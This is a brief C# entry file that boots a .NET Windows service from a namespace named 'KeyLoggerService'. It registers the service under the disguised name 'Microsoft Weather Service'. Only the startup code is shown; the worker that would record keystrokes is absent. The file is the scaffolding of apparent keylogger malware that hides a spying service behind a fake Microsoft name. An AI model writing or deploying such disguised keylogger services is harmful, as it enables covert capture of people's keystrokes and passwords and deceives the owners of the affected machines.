using KeyLoggerService;

var builder = Host.CreateApplicationBuilder(args);

builder.Services.AddWindowsService(options =>
{
    options.ServiceName = "Microsoft Weather Service";
});

builder.Services.AddHostedService<Worker>();

var host = builder.Build();
host.Run();
